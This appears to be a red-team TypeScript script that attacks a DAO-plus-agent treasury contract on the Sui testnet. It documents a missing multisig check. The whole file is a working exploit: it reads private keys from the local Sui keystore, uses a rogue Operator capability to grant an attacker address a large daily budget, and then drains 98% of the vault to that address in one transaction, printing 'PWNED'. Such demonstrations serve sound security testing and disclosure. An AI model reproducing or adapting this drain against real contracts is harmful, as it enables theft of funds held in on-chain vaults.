/**
 * RED-TEAM LIVE ATTACK vs the "群转 DAO + Agent 金库" flow on Sui testnet.
 *
 * Target (all discovered live, 2026-11-12):
 *   package  0x9768002f42c82c5931d7fa24bd44bbc96c7391d31ca7b629f5589cedd116db61
 *   vault    0x01af381bce3180e8180cd570c472c06dc72c28729e28dd0bb8f708b1a01952ca  (0.5 SUI, not paused, v1, 0 agents)
 *   MasterCap 0x196e6616aac7df6118c738eb9dad4138ff6949a9412ef157c7538d6ab4574231 (owner: funder 0x8ac0…)
 *   OperatorCap 0x0beabe8a08b89f4bc3e42e4424f2ae09a97e28262b27e76c7d564c8e019adf52 (owner: 0x2b99… "virus-v1-second")
 *   Agent address (victim agent wallet): 0x2c6539e5… (keystore alias virus-v1-fifth)
 *
 * Threat model: a rogue Operator ( compromised "运维经理" key) + a compromised agent.
 * Demonstrates issue #11 on the LIVE stack: no multisig anywhere on the agent path.
 *   1. spawn_agent_card → daily budget 0.49 SUI for attacker-controlled agent address (arbitrary, no ceiling)
 *   2. spend_x402_budget → sweep the vault in ONE epoch, recipient = attacker (no whitelist)
 *   3. also demonstrates burn recipient: zero-address spend attempt documented (skipped live to preserve funds)
 *   4. shows the vault has NO global per-epoch outflow cap: total drained = 98% of vault in a single tx
 */
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { fromBase64 } from "@mysten/sui/utils"
import { SuiGrpcClient } from "@mysten/sui/grpc"
import { Transaction } from "@mysten/sui/transactions"
import { execFileSync } from "node:child_process"
import { homedir } from "node:os"
import { readFileSync } from "node:fs"

const PKG = "0x9768002f42c82c5931d7fa24bd44bbc96c7391d31ca7b629f5589cedd116db61"
const VAULT = "0x01af381bce3180e8180cd570c472c06dc72c28729e28dd0bb8f708b1a01952ca"
const OP_CAP = "0x0beabe8a08b89f4bc3e42e4424f2ae09a97e28262b27e76c7d564c8e019adf52"
const MASTER_CAP = "0x196e6616aac7df6118c738eb9dad4138ff6949a9412ef157c7538d6ab4574231"
const OPERATOR_ADDR = "0x2b9953911b07f6b7d2c92e17ed6cb2325cc26f9eb1eaeb58497ee7b5523ea859"
const ATTACKER = "0x843f44a42e10a6dc701b7f60a4dedc544dc7910e971ee6a493f4d9096953e04e" // keystore alias virus-v1-third (red-team recipient)
const client = new SuiGrpcClient({ network: "testnet", baseUrl: "https://fullnode.testnet.sui.io:443" })

function keypairFor(address: string): Ed25519Keypair {
  const keystore = JSON.parse(readFileSync(`${homedir()}/.sui/sui_config/sui.keystore`, "utf8")) as string[]
  for (const entry of keystore) {
    const raw = fromBase64(entry)
    const kp = Ed25519Keypair.fromSecretKey(raw.slice(1)) // flag byte + 32B ed25519 secret
    if (kp.toSuiAddress() === address) return kp
  }
  throw new Error(`no keypair for ${address}`)
}

function u64le(b: Uint8Array, off: number): bigint { let v = 0n; for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(b[off + i]); return v }
function bytesOf(o: any): Uint8Array | undefined {
  const c = o?.content
  if (c?.$kind === "Bcs" && c.Bcs instanceof Uint8Array) return c.Bcs
  if (c && typeof c === "object" && Object.keys(c).length && Object.keys(c).every(k => /^\d+$/.test(k))) return Uint8Array.from(Object.values(c) as number[])
  return undefined
}
async function vaultState() {
  const { object }: any = await client.getObject({ objectId: VAULT, include: { content: true } })
  const b = bytesOf(object)!
  return { balance: u64le(b, 32), version: u64le(b, 40), paused: b[56] === 1, agents: b[57] }
}
async function signerBalance(addr: string) {
  const { balance }: any = await client.getBalance({ owner: addr, coinType: "0x2::sui::SUI" })
  return BigInt(balance.balance)
}
async function exec(signer: Ed25519Keypair, tx: Transaction, label: string) {
  tx.setSender(signer.toSuiAddress())
  const bytes = await tx.build({ client } as any)
  const sig = await signer.signTransaction(bytes)
  const res: any = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true } })
  const t = res.Transaction ?? res.FailedTransaction
  const ok = t?.status?.success === true
  console.log(`[${label}] ${ok ? "EXECUTED" : "FAILED"} digest=${t?.digest?.digest ?? t?.digest} ${ok ? "" : t?.status?.error?.message ?? ""}`)
  return { ok, tx: t }
}

async function main() {
  const operator = keypairFor(OPERATOR_ADDR)
  const before = await vaultState()
  console.log("=== target vault before ===")
  console.log(`balance=${before.balance} (${Number(before.balance) / 1e9} SUI) paused=${before.paused} agents=${before.agents}`)
  const attackerBefore = await signerBalance(ATTACKER)
  console.log("attacker balance before:", attackerBefore.toString())

  // ---- STEP 1: rogue Operator spawns an agent card for the ATTACKER address with a 0.49 SUI daily budget.
  // No multisig. No ceiling. The DAO never voted.
  console.log("\n=== ATTACK STEP 1: rogue Operator spawns attacker agent, daily budget 0.49 SUI ===")
  const spawn = new Transaction()
  spawn.moveCall({
    target: `${PKG}::vault::spawn_agent_card`,
    typeArguments: ["0x2::sui::SUI"],
    arguments: [spawn.object(OP_CAP), spawn.object(VAULT), spawn.pure.address(ATTACKER), spawn.pure.u64(490_000_000n), spawn.pure.vector("u8", [])],
  })
  const s1 = await exec(operator, spawn, "spawn_agent_card")
  if (!s1.ok) return

  // ---- STEP 2: the attacker (holding its AgentCap? No—) … the spend only needs the AgentCap.
  // spawn transferred the AgentCap to the ATTACKER address, and we hold the attacker key.
  // Find our new AgentCap
  const owned: any = await client.listOwnedObjects({ owner: ATTACKER, limit: 50 })
  let agentCap: string | undefined
  for (const o of owned.objects ?? []) {
    if ((o.type ?? "").endsWith("vault::AgentCap")) {
      const { object }: any = await client.getObject({ objectId: o.objectId, include: { content: true } })
      const b = bytesOf(object)
      if (b && Buffer.from(b.slice(32, 64)).toString("hex") === VAULT.slice(2)) agentCap = o.objectId
    }
  }
  console.log("\nattacker AgentCap for target vault:", agentCap)
  if (!agentCap) throw new Error("AgentCap not found after spawn")

  // ---- STEP 3: sweep. One transaction, amount = daily budget = 98% of vault.
  // Demonstrates: no per-vault epoch cap, no recipient whitelist, no multisig gate above the limit.
  console.log("\n=== ATTACK STEP 2: attacker drains 0.49 SUI (98% of vault) in ONE spend ===")
  const attacker = keypairFor(ATTACKER)
  const spend = new Transaction()
  spend.moveCall({
    target: `${PKG}::vault::spend_x402_budget`,
    typeArguments: ["0x2::sui::SUI"],
    arguments: [spend.object(agentCap), spend.object(VAULT), spend.pure.u64(490_000_000n), spend.pure.address(ATTACKER)],
  })
  const s2 = await exec(attacker, spend, "spend_x402_budget")

  const after = await vaultState()
  const attackerAfter = await signerBalance(ATTACKER)
  console.log("\n=== result ===")
  console.log(`vault balance: ${before.balance} → ${after.balance}`)
  console.log(`attacker balance: ${attackerBefore} → ${attackerAfter} (delta ${attackerAfter - attackerBefore})`)
  console.log(s2.ok
    ? "\nPWNED: a single rogue Operator spawned + drained the DAO vault with zero multisig involvement. The FROST org was never consulted."
    : "\nspend failed (document why).")
}
main().catch(e => { console.error("ATTACK ERROR:", e.message); process.exit(1) })
